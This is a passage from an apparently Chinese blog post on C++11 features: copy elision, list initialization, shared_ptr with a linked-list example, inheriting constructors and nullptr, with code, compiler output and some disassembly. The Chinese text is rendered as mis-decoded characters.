class="number">0</span>, <span class="type">int</span> _y = <span class="number">0</span>) : __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">const</span> Point &amp;point)</span><br><span class="line">    &#123;</span><br><span class="line">        __x = point.__x;</span><br><span class="line">        __y = point.__y;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;copy constructor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> Point <span class="title">Origin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;generating origin point...&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="function">Point <span class="title">origin</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;&amp;origin&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;origin point generated!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> origin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Point O=Point::<span class="built_in">Origin</span>();</span><br><span class="line">    cout&lt;&lt;&amp;O&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸»å‡½æ•°é‡Œå®šä¹‰äº†ä¸€ä¸ªPoint
O,æŒ‰ç…§ä¹‹å‰çš„è®¤è¯†,<code>Point O=Point::Origin();</code>è¿™å¥è¯åº”è¯¥æ˜¯è¿™æ ·æ‰§è¡Œçš„:</p>
<p>é¦–å…ˆè°ƒç”¨<code>Point::Origin()</code>,è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨æ„é€ å‡½æ•°</p>
<p>æ¥ç€<code>Point O=è¿”å›å€¼</code>è¿™é‡Œè¦å¯¹Oè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°</p>
<p>æ€»å…±æœ‰ä¸¤æ¬¡è°ƒç”¨æ„é€ å‡½æ•°,ç„¶è€Œå®é™…ä¸Šåªè°ƒç”¨äº†ä¸€æ¬¡</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">generating origin point...</span><br><span class="line">constructor called</span><br><span class="line">0x60fe88</span><br><span class="line">origin point generated!</span><br><span class="line">0x60fe88</span><br></pre></td></tr></table></figure>
<p>ä»ä¸¤æ¬¡åœ°å€çš„æ‰“å°æ¥çœ‹,ä¸¤ä¸ªå¯¹è±¡å®é™…ä¸Šæ˜¯ä¸€ä¸ªå¯¹è±¡,å› æ­¤Originå‡½æ•°å¯ä»¥è®¤ä¸ºè¿”å›çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ,ä»åæ±‡ç¼–çœ‹ç¡®å®å¦‚æ­¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mainä¸­:</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     [esp], eax      ; this</span><br><span class="line">call    __ZN5Point6OriginEv ; Point::Origin(void)</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">Point::Originä¸­:</span><br><span class="line">mov     dword ptr [esp+4], 1 ; int</span><br><span class="line">mov     dword ptr [esp], 1 ; this</span><br><span class="line">mov     ecx, [ebp+this]</span><br><span class="line">call    __ZN5PointC1Eii ; Point::Point(int,int)</span><br></pre></td></tr></table></figure>
<h2 id="åˆ—è¡¨åˆå§‹åŒ–">åˆ—è¡¨åˆå§‹åŒ–</h2>
<p>åœ¨å†™è¯æ³•åˆ†æå™¨çš„æ—¶å€™æœ‰è¿™ä¹ˆä¸€ä¸ªç¬¦å·ç±»</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Token</span></span><br><span class="line">&#123;</span><br><span class="line">    TokenType type;</span><br><span class="line">    std::string lexme;</span><br><span class="line">    <span class="type">double</span> value;</span><br><span class="line">    Func func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Token</span>(TokenType t = ERRORTOKEN, std::string l = <span class="string">&quot;&quot;</span>, <span class="type">double</span> v = <span class="number">0.0</span>, Func f = <span class="literal">NULL</span>) : <span class="built_in">type</span>(t),</span><br><span class="line">                                                                                         <span class="built_in">lexme</span>(l),</span><br><span class="line">                                                                                         <span class="built_in">value</span>(v),</span><br><span class="line">                                                                                         <span class="built_in">func</span>(f)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">///...å…¶ä»–æˆå‘˜å‡½æ•°</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨éœ€è¦å»ºç«‹ä¸€ä¸ªå†…å»ºç¬¦å·è¡¨,å¦‚æœä½¿ç”¨è€å¼çš„å†™æ³•</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;Token&gt; built_in_token_table=&#123;</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;PI&quot;</span>,<span class="number">3.1415926</span>,<span class="literal">NULL</span>),</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;E&quot;</span>,<span class="number">2.71828</span>,<span class="literal">NULL</span>),</span><br><span class="line">	...</span><br><span class="line">	<span class="built_in">Token</span>(DRAW,<span class="string">&quot;DRAW&quot;</span>,<span class="number">0.0</span>,<span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸ªæ¡ç›®éƒ½è¦æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°<code>Token(...)</code></p>
<p>è€Œå¦‚æœä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·æ•ˆæœå’Œä¸Šé¢ä¸€æ¨¡ä¸€æ ·,ä¹Ÿä¼šè°ƒç”¨æ„é€ å‡½æ•°,ä½†æ˜¯ä¸ç”¨å†™<code>Token(...)</code>,å®é™…ä¸Šä¹Ÿæ˜¯è°ƒç”¨ç›¸åº”å‚æ•°ä¸ªæ•°çš„æ„é€ å‡½æ•°</p>
<h2 id="lambdaè¡¨è¾¾å¼">Lambdaè¡¨è¾¾å¼</h2>
<p>åœ¨å®éªŒå®¤ç”µè„‘ä¸Š,å¼€å­¦ä¹ä¸Š</p>
<h2 id="æ™ºèƒ½æŒ‡é’ˆ">æ™ºèƒ½æŒ‡é’ˆ</h2>
<p>ä¹‹å‰C++å’ŒCçš„å †å†…å­˜ç®¡ç†è´£ä»»å…¨åœ¨ç¨‹åºå‘˜,newäº†ä¸deleteä¼šå†…å­˜æ³„æ¼,newäº†deleteä¸¤æ¬¡ä¼šé€ æˆäºŒæ¬¡é‡Šæ”¾æ¼æ´.</p>
<p>è€Œæœ‰äº›å¯¹è±¡åˆ°åº•å•¥æ—¶å€™é‡Šæ”¾,å¯èƒ½äººä¹ŸæŠŠæ¡ä¸å‡†,æ¯”å¦‚è¿™æ¬¡ç¼–è¯‘åŸç†å®éªŒä¸­,è¯æ³•åˆ†æå™¨çš„getTokenå‡½æ•°æ€»æ˜¯è¿”å›ä¸€ä¸ªToken*æŒ‡é’ˆ,å‡½æ•°å†…éƒ¨ä¼šåœ¨å †ä¸Šå¼€ä¸€å—å†…å­˜æ”¾å¯¹è±¡</p>
<p>ç„¶è€Œparseråœ¨ä½¿ç”¨å®Œäº†è¿™ä¸ªTokenä¹‹åæ²¡æœ‰ç«‹åˆ»é‡Šæ”¾,å› ä¸ºæˆ‘ä¹Ÿä¸çŸ¥é“å•¥æ—¶å€™ä¸€ä¸ªTokenæ‰ä¼šçœŸæ­£ä½¿ç”¨å®Œ,æ¯”å¦‚ä¸€ä¸ªTç±»å‹çš„Token,å®ƒä½œä¸ºå˜é‡å¯èƒ½ä¼šå­˜åœ¨ä¸€æ®µæ—¶é—´,æå‰ææ„äº†åæ¥å°±ä¼šè®¿é—®éæ³•å†…å­˜</p>
<p>äºæ˜¯Tokenå‡ ä¹éƒ½å­˜åœ¨å†…å­˜æ³„æ¼,è€Œæˆ‘ä¹Ÿä¸çŸ¥é“å’‹å¤„ç†</p>
<p>æ™ºèƒ½æŒ‡é’ˆå°±è§£å†³äº†è¿™ä¸ªå›°æ‰°</p>
<p>æ™ºèƒ½æŒ‡é’ˆå®é™…ä¸Šæ˜¯å¯¹æ™®é€šæŒ‡é’ˆçš„åŒ…è£…,ä½†æ˜¯ä»–ä¼šå¯¹å¯¹è±¡æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°</p>
<p>æ¯å½“æœ‰ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜çš„æ—¶å€™,å¼•ç”¨è®¡æ•°å°±ä¼šåŠ ä¸€,å½“ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆæ¶ˆäº¡æˆ–è€…ä¸å†æŒ‡å‘è¯¥å†…å­˜çš„æ—¶å€™,å¼•ç”¨è®¡æ•°å‡ä¸€,æœ€åä¸€ä¸ªä¸å†æŒ‡å‘è¯¥å†…å­˜çš„æ™ºèƒ½æŒ‡é’ˆä¼šå‘ç°å¼•ç”¨è®¡æ•°ä»1åˆ°0,äºæ˜¯å®ƒä¼šè‡ªåŠ¨ææ„è¿™ä¸ªå¯¹è±¡</p>
<p>æ˜¾ç„¶å°±ä¸ç”¨äººæ“å¿ƒåœ¨å•¥æ—¶å€™é‡Šæ”¾å¯¹è±¡äº†</p>
<p>åˆ°åº•å’‹ç”¨å‘¢?å†™ä¸€ä¸ªé“¾è¡¨ç±»æ„æ€æ„æ€</p>
<p>å…³é”®è¯:<code>make_shared,shared_ptr</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LinkedNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> __key;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; __next;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">int</span> _key=<span class="number">0</span>,shared_ptr&lt;LinkedNode&gt; _next=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">        __next=_next;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">LinkedNode</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode dtor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">shared_ptr&lt;LinkedNode&gt; <span class="title">getNext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKey</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setNext</span><span class="params">(shared_ptr&lt;LinkedNode&gt; _next)</span></span>&#123;</span><br><span class="line">        __next=_next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setKey</span><span class="params">(<span class="type">int</span> _key)</span></span>&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">to_string</span>(__key);</span><br><span class="line">    &#125;</span><br><span class="line">    LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span>&#123;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; head;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>()&#123;</span><br><span class="line">        head=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);<span class="comment">//æ³¨æ„åˆ›å»ºèŠ‚ç‚¹ä¸å†ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨make_shared&lt;ç±»å&gt;(å‚æ•°)åˆ›å»ºå¯¹è±¡,è¿”å›å€¼ç”¨shared_ptr&lt;ç±»å&gt;ç±»å‹æ‰¿è½½</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushHead</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(key,head-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">popHead</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(head-&gt;<span class="built_in">getNext</span>()-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>==head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        string buffer;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            buffer+=p-&gt;<span class="built_in">toString</span>()+<span class="string">&quot;  &quot;</span>;</span><br><span class="line">            p=p-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedList list;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        list.<span class="built_in">pushHead</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    list.<span class="built_in">popHead</span>();</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">9  8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br></pre></td></tr></table></figure>
<p>æ²¡æœ‰ä»»ä½•æ‰‹åŠ¨deleteçš„åœ°æ–¹,ä½†æ˜¯dtorä¾ç„¶è¢«è°ƒç”¨äº†</p>
<p><code>shared_ptr&lt;LinkedNode&gt;</code>å’Œ<code>LinkedNode *</code>,åœ¨ç”¨æ³•ä¸Šä¸€æ¨¡ä¸€æ ·,éƒ½æ˜¯ä½¿ç”¨ç®­å¤´è°ƒç”¨æˆå‘˜å‡½æ•°</p>
<p>ä½†æ˜¯<code>shared_ptr&lt;LinkedNode&gt;</code>å®é™…ä¸Šå°è£…äº†ä¸€ä¸ª<code>LinkedNode *</code>,å‰è€…è¿˜æœ‰å…¶ä»–åŠŸèƒ½</p>
<p>æ¯”å¦‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);</span><br><span class="line">cout&lt;&lt;hex&lt;&lt;node&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;node.<span class="built_in">get</span>()&lt;&lt;endl;<span class="comment">//getè¿”å›è£¸æŒ‡é’ˆLinkedNode*</span></span><br></pre></td></tr></table></figure>
<p>nodeå¯ä»¥ä½¿ç”¨ç‚¹å·è°ƒç”¨shared_ptrç±»çš„æˆå‘˜å‡½æ•°,ä½¿ç”¨ç®­å¤´ç¬¦å·è°ƒç”¨çš„æ˜¯å…¶æ‰˜ç®¡å¯¹è±¡ç±»çš„æˆå‘˜å‡½æ•°</p>
<h2 id="ç»§æ‰¿æ„é€ å‡½æ•°">ç»§æ‰¿æ„é€ å‡½æ•°</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x , <span class="type">int</span> _y ) :</span><br><span class="line">        __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+<span class="built_in">to_string</span>(__x)+<span class="string">&quot;,&quot;</span>+<span class="built_in">to_string</span>(__y)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaggedPoint</span>:<span class="keyword">public</span> Point&#123;</span><br><span class="line">    string __tag;</span><br><span class="line">    <span class="keyword">using</span> Point::Point;<span class="comment">//ç»§æ‰¿çˆ¶ç±»æ‰€æœ‰æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TaggedPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y,string _tag):<span class="built_in">TaggedPoint</span>(_x,_y)&#123;<span class="comment">//å§”æ‰˜æ„é€ å‡½æ•°,ä¹Ÿæ˜¯c++11ç‰¹æ€§</span></span><br><span class="line">        __tag=_tag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __tag+Point::<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">TaggedPoint <span class="title">A</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//TaggedPointæœ¬æ²¡æœ‰ä¸¤ä¸ªintçš„æ„é€ å‡½æ•°,ä½†æ˜¯å…¶çˆ¶ç±»æœ‰</span></span><br><span class="line">    cout&lt;&lt;A.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="nullptr">nullptr</h2>
<p>ä¹‹å‰è¡¨ç¤ºç©ºæŒ‡é’ˆéƒ½ä½¿ç”¨NULL,è€Œå®é™…ä¸Šè¿™æ˜¯ä¸ªint 0</p>
<p>c++11ä¹‹åè¡¨ç¤ºç©ºæŒ‡é’ˆçš„å¸¸é‡æ˜¯nullptr</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span> *ptr)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ptr func called&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> value)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;value func called&quot;</span>&lt;&lt;endl;</span><br><span 